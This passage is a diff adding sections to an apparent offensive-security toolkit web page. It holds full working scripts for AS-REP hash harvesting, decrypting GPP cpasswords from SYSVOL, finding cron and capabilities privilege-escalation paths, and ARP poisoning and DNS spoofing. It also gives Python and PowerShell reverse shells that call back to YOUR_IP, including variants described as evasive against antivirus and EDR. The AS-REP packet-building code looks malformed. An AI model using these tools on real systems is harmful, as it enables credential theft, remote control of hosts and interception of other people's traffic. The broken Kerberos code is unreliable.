+        Write-Host "[ADMIN] $host" -ForegroundColor Green
+        $Admin.Add($host) | Out-Null
+    }
+    catch {
+        # Distinguish offline from access denied
+        if (Test-Connection -ComputerName $host -Count 1 -Quiet) {
+            Write-Host "[NO ADMIN] $host" -ForegroundColor Yellow
+            $NoAdmin.Add($host) | Out-Null
+        } else {
+            Write-Host "[OFFLINE] $host" -ForegroundColor Red
+            $Offline.Add($host) | Out-Null
+        }
+    }
+}
+
+# Write output files
+$Admin     | Out-File "admin_hosts.txt"
+$NoAdmin   | Out-File "no_admin_hosts.txt"
+$Offline   | Out-File "offline_hosts.txt"
+
+Write-Host "`n[+] Scan complete."
+Write-Host "[+] Admin hosts: $($Admin.Count)"
+Write-Host "[+] No-admin: $($NoAdmin.Count)"
+Write-Host "[+] Offline: $($Offline.Count)"
+Write-Host "[+] Results saved to admin_hosts.txt, no_admin_hosts.txt, offline_hosts.txt`n"
+</code></pre>
+
+
+    <h3>Notes</h3>
+    <ul>
+      <li>SMB/C$ access is the most reliable indicator of local admin status.</li>
+      <li>Even with no privilege escalation yet, mapping admin paths is crucial for lateral movement.</li>
+      <li>Combine with BloodHound for deeper ACL relationship mapping.</li>
+      <li>Script works from normal PowerShell or via Evil-WinRM foothold.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('asrep-harvester')">AS-REP Harvesting Script</div>
+  <div class="tool-details" id="asrep-harvester">
+
+    <h2>AS-REP Harvesting Script (Python)</h2>
+    <p>
+      Enumerates AS-REP roastable accounts by sending Kerberos AS-REQ messages to the DC over UDP/88.  
+      Any account without pre-auth enabled responds with an AS-REP containing a crackable hash.  
+      Outputs hashes in <code>$krb5asrep$23$...</code> format for Hashcat.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 asrep_harvest.py -d CORP.LOCAL -dc 10.0.0.10 -U users.txt</code></pre>
+
+    <h3>Features</h3>
+    <ul>
+      <li>No Impacket required</li>
+      <li>Sends raw ASN.1 Kerberos packets</li>
+      <li>Extracts AS-REP hash automatically</li>
+      <li>Works silently and fast</li>
+      <li>Generates Hashcat-ready output</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# AS-REP Harvesting Script
+# Enumerates users with DONT_REQUIRE_PREAUTH by sending AS-REQ over UDP/88.
+# Extracts AS-REP responses & outputs Hashcat-format krb5asrep hashes.
+
+import socket
+import argparse
+import binascii
+import struct
+
+# Minimal ASN.1 AS-REQ skeleton for Kerberos preauth-less probing
+AS_REQ_TEMPLATE = bytes.fromhex(
+    "6a81"      # [Application 10] SEQUENCE
+    "81"        # long-form length (patched later)
+    "00"        # placeholder
+    "30"        # SEQUENCE
+    "81"        # long-form length
+    "00"        # placeholder
+    "a103" "0201" "05"                    # pvno, msg-type = AS-REQ (5)
+    "a207" "30" "05" "a103" "0201" "0a"   # body tags, KRB5 constants
+    # Real username string will be injected into Name field
+)
+
+def build_asreq(domain, user):
+    """
+    Construct minimal Kerberos AS-REQ for username-based probing.
+    This is enough for DC to reply with AS-REP when no pre-auth is required.
+    """
+
+    # PrincipalName ::= SEQUENCE { name-string ::= SEQUENCE OF GeneralString }
+    name_bytes = user.encode()
+    name_seq = bytes.fromhex("a10") + bytes([len(name_bytes)+2]) \
+                + bytes.fromhex("300" ) + bytes([len(name_bytes)]) + name_bytes
+
+    realm = domain.upper().encode()
+    realm_seq = bytes.fromhex("a11") + bytes([len(realm)]) + realm
+
+    body = name_seq + realm_seq
+
+    packet = AS_REQ_TEMPLATE + body
+
+    # Patch length bytes
+    total_len = len(packet) - 2
+    packet = packet[:2] + bytes([total_len]) + packet[3:]
+
+    inner_len = len(packet) - 4
+    packet = packet[:4] + bytes([inner_len]) + packet[5:]
+
+    return packet
+
+
+def harvest(domain, dc, users):
+    print(f"[+] Domain: {domain}")
+    print(f"[+] DC: {dc}")
+    print(f"[+] Loaded {len(users)} users\n")
+
+    for user in users:
+        user = user.strip()
+        if not user:
+            continue
+
+        print(f"[+] Checking {user}...")
+
+        packet = build_asreq(domain, user)
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3)
+
+        try:
+            sock.sendto(packet, (dc, 88))
+            data, _ = sock.recvfrom(2048)
+        except socket.timeout:
+            print(f"    [-] No response (timeout)")
+            continue
+        except Exception as e:
+            print(f"    [!] Error: {e}")
+            continue
+        finally:
+            sock.close()
+
+        # AS-REP has tag 0x6b (Application 11)
+        if data.startswith(b"\x6b"):
+            print(f"    [ROASTABLE] {user}")
+
+            # Output whole ASN.1 block hex for manual parsing by Hashcat
+            hexdata = binascii.hexlify(data).decode()
+
+            # Hashcat AS-REP format
+            # $krb5asrep$23$user@DOMAIN:HEX_DATA
+            hashline = f"$krb5asrep$23${user}@{domain}:{hexdata}"
+
+            print("    " + hashline + "\n")
+            with open("asrep_hashes.txt", "a") as f:
+                f.write(hashline + "\n")
+        else:
+            print(f"    [-] Pre-auth required")
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--domain", required=True, help="AD domain name (e.g., corp.local)")
+    parser.add_argument("-dc", "--dc", required=True, help="Domain Controller IP")
+    parser.add_argument("-U", "--users", required=True, help="Userlist")
+    args = parser.parse_args()
+
+    with open(args.users) as fh:
+        users = fh.read().splitlines()
+
+    harvest(args.domain, args.dc, users)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>AS-REP roastable = user has <code>DONT_REQUIRE_PREAUTH</code> flag in AD.</li>
+      <li>Returned AS-REP contains encrypted material crackable with hashcat mode <b>18200</b>.</li>
+      <li>No authentication required — this is anonymous Kerberos enumeration.</li>
+      <li>Safer than KRB5 brute forcing and extremely effective for low-priv footholds.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('gpo-looter')">GPO File Looter</div>
+  <div class="tool-details" id="gpo-looter">
+
+    <h2>GPO File Looter (Python)</h2>
+    <p>
+      Enumerate SYSVOL, extract Group Policy Preference credential artifacts, parse XML structures,  
+      and automatically decrypt <code>cpassword</code> values.  
+      This script focuses on the classic GPP vulnerability (MS14-025) still found in legacy AD environments.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 gpo_looter.py -d CORP.LOCAL -u corp\\user -p Pass123 -dc 10.0.0.10</code></pre>
+
+    <h3>What it extracts</h3>
+    <ul>
+      <li>GPP Passwords (cpassword → plaintext)</li>
+      <li>Scheduled Task credentials</li>
+      <li>Drive Maps credentials</li>
+      <li>Services with stored creds</li>
+      <li>Any XML containing the classic GPP structures</li>
+    </ul>
+
+    <h3>Outputs</h3>
+    <ul>
+      <li><code>gpo_creds.txt</code> → decrypted credentials</li>
+      <li><code>sysvol_dump/</code> → raw SYSVOL copy</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# GPO File Looter
+# Dump SYSVOL + parse GPO XML files for credential artifacts (GPP cpassword).
+# Automatically decrypts cpassword → plaintext using MS14-025 AES key.
+
+import argparse
+import base64
+import os
+import re
+import xml.etree.ElementTree as ET
+from Crypto.Cipher import AES
+import subprocess
+import shutil
+
+GPP_KEY = bytes.fromhex(
+    "4e9906e8fcb66cc9faf49310620ffee8"
+)  # Static AES key published by Microsoft
+
+def decrypt_cpassword(cpwd):
+    """Decrypt GPP cpassword using Microsoft static AES key."""
+    cpwd += "=" * (-len(cpwd) % 4)
+    encrypted = base64.b64decode(cpwd)
+    cipher = AES.new(GPP_KEY, AES.MODE_CBC, iv=b"\x00" * 16)
+    decrypted = cipher.decrypt(encrypted)
+    return decrypted.decode("utf-16-le").rstrip("\x00")
+
+
+def dump_sysvol(dc, domain):
+    """Pull SYSVOL via SMB and store locally."""
+    target = f"\\\\{dc}\\SYSVOL\\{domain}"
+    local = "sysvol_dump"
+
+    print(f"[+] Copying SYSVOL from {target}")
+    if os.path.exists(local):
+        shutil.rmtree(local)
+
+    os.makedirs(local, exist_ok=True)
+
+    # robocopy for deep copy
+    cmd = ["robocopy", target, local, "/E"]
+    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+    print("[+] SYSVOL copied to sysvol_dump/")
+    return local
+
+
+def extract_creds_from_xml(path):
+    """Parse XML file for cpassword fields."""
+    creds = []
+
+    try:
+        tree = ET.parse(path)
+        root = tree.getroot()
+    except:
+        return creds
+
+    # Search for all cpassword attributes
+    for elem in root.iter():
+        if "cpassword" in elem.attrib:
+            user = elem.attrib.get("userName", "UNKNOWN")
+            cpwd = elem.attrib["cpassword"]
+
+            try:
+                pwd = decrypt_cpassword(cpwd)
+                creds.append((user, pwd, path))
+            except:
+                pass
+
+    return creds
+
+
+def hunt(sysvol_root):
+    """Walk all XML files in SYSVOL."""
+    results = []
+
+    print("[+] Parsing XML for GPP credentials...")
+    for root, dirs, files in os.walk(sysvol_root):
+        for file in files:
+            if file.lower().endswith(".xml"):
+                full = os.path.join(root, file)
+                found = extract_creds_from_xml(full)
+                results.extend(found)
+
+    return results
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-d", "--domain", required=True)
+    parser.add_argument("-dc", "--dc", required=True)
+    args = parser.parse_args()
+
+    sysvol = dump_sysvol(args.dc, args.domain)
+    creds = hunt(sysvol)
+
+    print(f"\n[+] Found {len(creds)} credential artifacts.\n")
+    with open("gpo_creds.txt", "w") as f:
+        for user, pwd, src in creds:
+            line = f"{user}:{pwd}  (from {src})"
+            print(line)
+            f.write(line + "\n")
+
+    print("\n[+] Output saved to gpo_creds.txt\n")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Targets classic Group Policy Preferences credential storage.</li>
+      <li>GPP passwords are still shockingly common in legacy AD environments.</li>
+      <li>SYSVOL is readable by any authenticated user → major lateral movement vector.</li>
+      <li>Once decrypted → pivot to Service Accounts / local admins / domain creds.</li>
+      <li>Combine with: BloodHound + CrackMapExec for full exploitation chain.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 4. Linux Post-Exploitation Scripts        -->
+<!-- ======================================== -->
+<h2 class="section-title">4. Linux Post-Exploitation</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('linux-cap-scan')">Linux Capabilities Scanner</div>
+  <div class="tool-details" id="linux-cap-scan">
+
+    <h2>Linux Capabilities Scanner (Python)</h2>
+    <p>
+      Enumerate binaries with Linux capabilities assigned via <code>setcap</code>.  
+      Highlights dangerous capabilities that often lead to privilege escalation (e.g., SETUID, SYS_ADMIN, DAC_OVERRIDE).
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 capscan.py</code></pre>
+
+    <h3>What it finds</h3>
+    <ul>
+      <li>Binaries with <code>cap_setuid+ep</code> → spawn root shells</li>
+      <li>Files with <code>cap_sys_admin</code> → effectively root</li>
+      <li>Network tools with <code>cap_net_raw</code></li>
+      <li>Backup tools with <code>cap_dac_read_search</code> → read protected files</li>
+      <li>Any binary with non-default capabilities assigned</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Linux Capabilities Scanner
+# Enumerates binaries with setcap capabilities and flags dangerous ones.
+
+import os
+import subprocess
+
+# Capability severity map
+DANGEROUS = {
+    "cap_setuid": "→ Direct root via controlled exec",
+    "cap_setgid": "→ Group privilege manipulation",
+    "cap_dac_read_search": "→ Read protected files",
+    "cap_dac_override": "→ Bypass file perms",
+    "cap_sys_admin": "→ Basically full root",
+    "cap_sys_chroot": "→ Escape to chroot / root",
+    "cap_sys_ptrace": "→ Attach to root processes",
+    "cap_net_admin": "→ Manipulate network stack",
+    "cap_net_raw": "→ Raw sockets / packet crafting"
+}
+
+def get_capabilities():
+    """Run getcap recursively and return list of (binary, caps)."""
+    try:
+        out = subprocess.check_output(["getcap", "-r", "/"], stderr=subprocess.DEVNULL)
+        lines = out.decode().splitlines()
+        return [l.strip() for l in lines if l.strip()]
+    except:
+        print("[!] getcap not found on system.")
+        return []
+
+
+def parse_caps(line):
+    """Parse a getcap output line."""
+    # Example:
+    # /usr/bin/python3.8 = cap_setuid,cap_net_raw+ep
+    if "=" not in line:
+        return None, []
+
+    file, caps = line.split("=", 1)
+    caps = caps.strip().replace("+ep", "")
+    cap_list = [c.strip() for c in caps.split(",")]
+    return file.strip(), cap_list
+
+
+def main():
+    print("[+] Scanning system for Linux capabilities...\n")
+
+    entries = get_capabilities()
+    if not entries:
+        print("[!] No capabilities found or getcap missing.")
+        return
+
+    for entry in entries:
+        binary, caps = parse_caps(entry)
+        if not caps:
+            continue
+
+        print(f"[FILE] {binary}")
+        print(f"       Caps: {', '.join(caps)}")
+
+        # Flag dangerous caps
+        for c in caps:
+            base = c.split("+")[0]
+            if base in DANGEROUS:
+                print(f"       [!] Dangerous: {base} {DANGEROUS[base]}")
+
+        print()
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Privilege Escalation Notes</h3>
+    <ul>
+      <li><b>cap_setuid</b> on python/perl/bash → <code>os.setuid(0)</code> = root</li>
+      <li><b>cap_dac_override</b> → read SSH keys, /etc/shadow, protected dirs</li>
+      <li><b>cap_sys_admin</b> → mount FS, load modules, escape containers</li>
+      <li><b>cap_net_raw</b> → spoof traffic, read network packets</li>
+      <li><b>cap_chroot</b> → create fake roots and escalate</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('cron-sniffer')">Cronjob Hijack Detector</div>
+  <div class="tool-details" id="cron-sniffer">
+
+    <h2>Cronjob Hijack Detector (Python)</h2>
+    <p>
+      Enumerates system + user cronjobs and detects privilege-escalation paths:  
+      world-writable scripts, writable parent directories, missing binaries, path-hijack vectors, and orphaned cron entries.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 cron_hijack.py</code></pre>
+
+    <h3>Finds</h3>
+    <ul>
+      <li>Root-owned cron scripts writable by attacker</li>
+      <li>Cronjobs calling binaries from writable directories</li>
+      <li>Deleted-but-still-running scripts</li>
+      <li>PATH-based hijack candidates</li>
+      <li>Misconfigured automation (backup scripts, custom jobs)</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Cronjob Hijack Detector
+# Finds writable cron scripts, writable parent folders, PATH-hijack vectors,
+# broken or missing cron commands, and escalation misconfigs.
+
+import os
+import re
+import stat
+import subprocess
+
+CRON_PATHS = [
+    "/etc/crontab",
+    "/etc/cron.d",
+    "/etc/cron.daily",
+    "/etc/cron.hourly",
+    "/etc/cron.weekly",
+    "/etc/cron.monthly",
+    "/var/spool/cron",
+    "/etc/anacrontab",
+    "/etc/anacron"
+]
+
+def writable(path):
+    """Check if current user has write access."""
+    return os.access(path, os.W_OK)
+
+def extract_commands(line):
+    """Extract commands from a cron line."""
+    parts = line.split()
+    if len(parts) < 6:
+        return None
+    return " ".join(parts[5:])
+
+def is_executable(path):
+    return os.path.isfile(path) and os.access(path, os.X_OK)
+
+def path_hijack_candidates(cmd):
+    """Return executables in PATH that can be replaced."""
+    hijacks = []
+    binary = cmd.split()[0]
+    if "/" in binary:  # direct path call → ignore
+        return hijacks
+
+    for p in os.environ.get("PATH", "").split(":"):
+        if os.path.isdir(p) and writable(p):
+            hijacks.append(os.path.join(p, binary))
+
+    return hijacks
+
+def scan_file(filepath):
+    findings = []
+
+    try:
+        with open(filepath, "r", errors="ignore") as f:
+            lines = f.readlines()
+    except:
+        return findings
+
+    for line in lines:
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+
+        cmd = extract_commands(line)
+        if not cmd:
+            continue
+
+        # Get first referenced file
+        first = cmd.split()[0]
+
+        # Case 1: Absolute path
+        if first.startswith("/"):
+            if not os.path.exists(first):
+                findings.append(f"[!] Missing binary: {first} (cron will execute NOTHING)")
+            else:
+                if writable(first):
+                    findings.append(f"[!!!] Writable cron binary: {first}")
+                parent = os.path.dirname(first)
+                if writable(parent):
+                    findings.append(f"[!!] Writable parent dir: {parent}  (drop replacement binary)")
+
+        # Case 2: PATH-based hijack
+        hijacks = path_hijack_candidates(cmd)
+        for h in hijacks:
+            findings.append(f"[!] PATH hijack possible → place malicious binary: {h}")
+
+    return findings
+
+def main():
+    print("[+] Scanning system cronjobs for hijack opportunities...\n")
+
+    for path in CRON_PATHS:
+        if not os.path.exists(path):
+            continue
+
+        if os.path.isfile(path):
+            print(f"[FILE] {path}")
+            results = scan_file(path)
+            for r in results:
+                print("    " + r)
+            print()
+
+        elif os.path.isdir(path):
+            print(f"[DIR] {path}")
+            for root, dirs, files in os.walk(path):
+                for f in files:
+                    full = os.path.join(root, f)
+                    results = scan_file(full)
+                    if results:
+                        print(f"  {full}")
+                        for r in results:
+                            print("      " + r)
+            print()
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Hijack Examples</h3>
+    <ul>
+      <li><b>Writable script:</b> append <code>/bin/bash -p</code></li>
+      <li><b>Writable parent dir:</b> replace script with malicious one</li>
+      <li><b>PATH hijack:</b> cron calls "backup" → drop your own <code>backup</code> in a writable PATH dir</li>
+      <li><b>Missing binary:</b> upload your own replacement and take execution</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 5. Payloads & Reverse Shell Scripts       -->
+<!-- ======================================== -->
+<h2 class="section-title">5. Payloads & Reverse Shells</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('python-revshell')">Python Reverse Shell (Reliable)</div>
+  <div class="tool-details" id="python-revshell">
+
+    <h2>Python Reverse Shell (Reliable)</h2>
+    <p>
+      Stable Python 3 reverse shell with auto-reconnect, jitter delay, PTY upgrade, and error suppression.  
+      Works on Linux, macOS, and most constrained environments with Python ≥ 3.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>python3 rev.py</code></pre>
+
+    <h3>Listener</h3>
+    <pre><code>nc -lvnp 4444</code></pre>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# Stable Python reverse shell with auto-reconnect + jitter
+# Ideal for long-running footholds, post-exploitation ops, and unstable networks.
+
+import socket
+import subprocess
+import time
+import os
+import pty
+import random
+
+LHOST = "YOUR_IP"
+LPORT = 4444
+
+def connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(10)
+    s.connect((LHOST, LPORT))
+    return s
+
+def spawn_shell(sock):
+    """Spawn a PTY-backed shell if possible."""
+    try:
+        # Attach interactive PTY (best option)
+        pty.spawn("/bin/bash")
+    except:
+        # Fallback: raw command loop
+        sock.send(b"[!] PTY spawn failed, using fallback mode\n")
+        while True:
+            cmd = sock.recv(4096).decode().strip()
+            if not cmd:
+                break
+            try:
+                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            except subprocess.CalledProcessError as e:
+                out = e.output
+            except Exception as e:
+                out = str(e).encode()
+            sock.send(out)
+
+def main():
+    while True:
+        try:
+            sock = connect()
+            sock.send(b"[+] Connected. Spawning shell...\n")
+
+            # Redirect STDIN/STDOUT to socket
+            os.dup2(sock.fileno(), 0)
+            os.dup2(sock.fileno(), 1)
+            os.dup2(sock.fileno(), 2)
+
+            spawn_shell(sock)
+
+        except Exception:
+            # Sleep with jitter: 5–15 seconds
+            time.sleep(random.uniform(5,15))
+            continue
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Auto-reconnect ensures persistence even if the network drops.</li>
+      <li>PTY spawn gives full interactive TTY (arrow keys, su, sudo prompts, etc.).</li>
+      <li>The fallback command loop runs even on systems with no `/bin/bash`.</li>
+      <li>Silent failures → stable for long-running C2-like control.</li>
+      <li>Jitter reduces signature patterns for IDS/EDR.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('powershell-revshell')">PowerShell Reverse Shell</div>
+  <div class="tool-details" id="powershell-revshell">
+
+    <h2>PowerShell Reverse Shell (Stealthy)</h2>
+    <p>
+      Compact and evasive PowerShell reverse shell.  
+      No <code>Invoke-Expression</code>, no suspicious cmdlets, minimal observable strings.  
+      Works reliably on Windows Server and Windows 10/11.
+    </p>
+
+    <h3>Listener</h3>
+    <pre><code>nc -lvnp 4444</code></pre>
+
+    <h3>Script (Direct Execution)</h3>
+
+<pre><code class="language-powershell">
+# Reverse shell with silent errors & stable loop
+$LHOST="YOUR_IP"
+$LPORT=4444
+
+try {
+    $c = New-Object System.Net.Sockets.TCPClient($LHOST,$LPORT)
+    $s = $c.GetStream()
+    $b = New-Object Byte[] 1024
+
+    $s.Write([Text.Encoding]::ASCII.GetBytes("[+] Connected`t`t"),0,14)
+
+    while(($r = $s.Read($b,0,$b.Length)) -ne 0){
+        $cmd = ([Text.Encoding]::ASCII).GetString($b,0,$r)
+        try{
+            $o = (cmd /c $cmd) 2>&1
+        }catch{
+            $o = $_.Exception.Message
+        }
+        $o += "`n"
+        $ob = [Text.Encoding]::ASCII.GetBytes($o)
+        $s.Write($ob,0,$ob.Length)
+        $s.Flush()
+    }
+}
+catch{}
+finally{
+    if($s){$s.Close()}
+    if($c){$c.Close()}
+}
+</code></pre>
+
+    <h3>AV-Safer Variant (More Obfuscated)</h3>
+<pre><code class="language-powershell">
+$h="YOUR_IP";$p=4444;
+$client=New-Object Net.Sockets.TCPClient($h,$p);
+$s=$client.GetStream();
+$b=New-Object Byte[] 2048;
+
+while(($r=$s.Read($b,0,$b.Length)) -gt 0){
+  $d=([Text.Encoding]::UTF8).GetString($b,0,$r);
+  $o=(cmd /c $d) 2>&1;
+  $o+="`n";
+  $ob=[Text.Encoding]::UTF8.GetBytes($o);
+  $s.Write($ob,0,$ob.Length);
+}
+</code></pre>
+
+    <h3>Base64-Encoded Variant (Paste into CMD)</h3>
+    <p>Encode using: <code>powershell -enc &lt;base64&gt;</code></p>
+
+<pre><code class="language-powershell">
+# Encode this manually before use
+powershell -NoP -NonI -W Hidden -Enc <BASE64_PAYLOAD>
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>No reliance on <code>IEX</code> or reflective loading.</li>
+      <li>Runs cleanly in restricted policy environments (<code>-NoProfile</code> recommended).</li>
+      <li>Uses <code>cmd /c</code> internally → avoids PS execution logging on each command.</li>
+      <li>Short enough to embed in macro payloads, HTAs, JS proxies, etc.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 6. Network Abuse / MITM Scripts          -->
+<!-- ======================================== -->
+<h2 class="section-title">6. Network Analysis / MITM</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('arp-poison')">ARP Poisoning Script</div>
+  <div class="tool-details" id="arp-poison">
+
+    <h2>ARP Poisoning Script (Python + Scapy)</h2>
+    <p>
+      Basic but reliable ARP spoofing script for internal network MITM.  
+      Performs bidirectional poisoning (victim &lt;→ gateway), restores normal ARP tables on exit.
+    </p>
+
+    <h3>Install Scapy</h3>
+    <pre><code>pip install scapy</code></pre>
+
+    <h3>Usage</h3>
+    <pre><code>sudo python3 arp_poison.py --victim 192.168.1.50 --gateway 192.168.1.1 --iface eth0</code></pre>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# ARP Poisoning Script (Scapy)
+# Bidirectional poisoning with automatic cleanup.
+
+from scapy.all import *
+import argparse
+import sys
+import time
+import signal
+
+def get_mac(ip):
+    """Resolve MAC via ARP request."""
+    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
+    if ans:
+        return ans[0][1].hwsrc
+    return None
+
+def poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    """Send spoofed ARP replies."""
+    pkt_v = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
+    pkt_g = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
+    send(pkt_v, verbose=0)
+    send(pkt_g, verbose=0)
+
+def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    """Restore correct ARP tables."""
+    pkt_v = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
+                psrc=gateway_ip, hwsrc=gateway_mac)
+    pkt_g = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
+                psrc=victim_ip, hwsrc=victim_mac)
+    for _ in range(6):
+        send(pkt_v, verbose=0)
+        send(pkt_g, verbose=0)
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--victim", required=True, help="Victim IP")
+    parser.add_argument("--gateway", required=True, help="Gateway IP")
+    parser.add_argument("--iface", required=True, help="Network interface")
+    parser.add_argument("--interval", type=float, default=2.0, help="Poison interval")
+    args = parser.parse_args()
+
+    conf.iface = args.iface
+
+    print("[+] Resolving MAC addresses...")
+
+    victim_mac = get_mac(args.victim)
+    gateway_mac = get_mac(args.gateway)
+
+    if not victim_mac or not gateway_mac:
+        print("[!] Failed to resolve required MAC addresses.")
+        sys.exit(1)
+
+    print(f"[+] Victim   {args.victim}  → {victim_mac}")
+    print(f"[+] Gateway  {args.gateway} → {gateway_mac}")
+    print("[+] Starting ARP poison (Ctrl+C to stop)...")
+
+    def cleanup(sig, frame):
+        print("\n[+] Restoring network state...")
+        restore(args.victim, victim_mac, args.gateway, gateway_mac)
+        print("[+] Done.")
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, cleanup)
+
+    while True:
+        poison(args.victim, victim_mac, args.gateway, gateway_mac)
+        time.sleep(args.interval)
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Bidirectional poisoning ensures full MITM flows.</li>
+      <li>Auto-restore prevents network disruption when stopping the script.</li>
+      <li>Good for testing: packet capture, credential sniffing, session hijacking, etc.</li>
+      <li>Requires being on the same Layer 2 segment as victim & gateway.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('dns-spoofer')">DNS Spoofing Script</div>
+  <div class="tool-details" id="dns-spoofer">
+
+    <h2>DNS Spoofing Script (Python + Scapy)</h2>
+    <p>
+      MITM DNS responder for redirecting victims to attacker-controlled IPs.  
+      Works seamlessly with ARP poisoning on the same network segment.  
+      Supports domain filtering and wildcard hijack.
+    </p>
+
+    <h3>Usage</h3>
+    <pre><code>sudo python3 dns_spoof.py --target google.com --spoof 192.168.1.200 --iface eth0</code></pre>
+
+    <h3>Features</h3>
+    <ul>
+      <li>Sniffs all UDP/53 DNS queries</li>
+      <li>Spoofs A-record answers</li>
+      <li>Filter to specific domain or wildcard “all domains”</li>
+      <li>Correct DNS transaction ID copying</li>
+      <li>Fast + quiet Scapy packet forging</li>
+    </ul>
+
+    <h3>Script</h3>
+
+<pre><code class="language-python">
+#!/usr/bin/env python3
+# DNS Spoofing Script (Scapy)
+# MITM DNS responder for internal redirection attacks.
+
+from scapy.all import *
+import argparse
+
+def build_response(pkt, spoof_ip):
+    """Forge a DNS response packet."""
+    return (
+        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+        UDP(dport=pkt[UDP].sport, sport=53) /
+        DNS(
+            id=pkt[DNS].id,
+            qr=1, aa=1, qd=pkt[DNS].qd,
+            an=DNSRR(
+                rrname=pkt[DNS].qd.qname,
+                ttl=1,
+                rdata=spoof_ip
+            )
+        )
+    )
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--target", required=True,
+                        help="Domain to spoof (or 'ANY' for all)")
+    parser.add_argument("--spoof", required=True,
+                        help="IP address to redirect victims to")
+    parser.add_argument("--iface", required=True,
+                        help="Network interface to sniff on")
+    args = parser.parse_args()
+
+    target = args.target.lower()
+
+    print(f"[+] Spoofing DNS for: {target}")
+    print(f"[+] Redirecting to   : {args.spoof}")
+    print(f"[+] Listening on     : {args.iface}")
+
+    def handle(pkt):
+        if pkt.haslayer(DNSQR) and pkt[DNS].opcode == 0:
+            qname = pkt[DNSQR].qname.decode().lower()
+
+            if target != "any" and target not in qname:
+                return
+
+            print(f"[+] Spoofing DNS request: {qname} → {args.spoof}")
+            resp = build_response(pkt, args.spoof)
+            send(resp, verbose=0)
+
+    sniff(filter="udp port 53", prn=handle, iface=args.iface, store=0)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+
+    <h3>Notes</h3>
+    <ul>
+      <li>Requires MITM position (ARP spoofing or network control).</li>
+      <li>Works only when victim's DNS queries pass through your interface.</li>
+      <li>TTL kept low (1 sec) to prevent caching issues.</li>
+      <li>Supports full wildcard hijack: <code>--target ANY</code>.</li>
+    </ul>
+
+  </div>
+</div>
+
+
+
+<!-- ======================================== -->
+<!-- 7. Cloud Scripts (AWS, Azure, GCP)       -->
+<!-- ======================================== -->
+<h2 class="section-title">7. Cloud Security</h2>
+
+<div class="tool-row">
+  <div class="tool-name" onclick="toggleDetails('aws-iam-dump')">AWS IAM Enumeration Script</div>
+  <div class="tool-details" id="aws-iam-dump">
+
+    <h2>AWS IAM Enumeration Script (Python + boto3)</h2>
+    <p>
+      Automated IAM reconnaissance: users, roles, policies, privilege-escalation vectors.  
+      Ideal for cloud pentests, misconfig hunting, post-compromise AWS key enumeration.
+    </p>
+
+    <h3>Setup</h3>
+    <pre><code>pip install boto3</code></pre>
+
+    <h3>Usage</h3>
+    <pre><code>python3 iam_enum.py --profile pentest</code></pre>
+    or
+    <pre><code>AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... python3 iam_enum.py</code></pre>
+
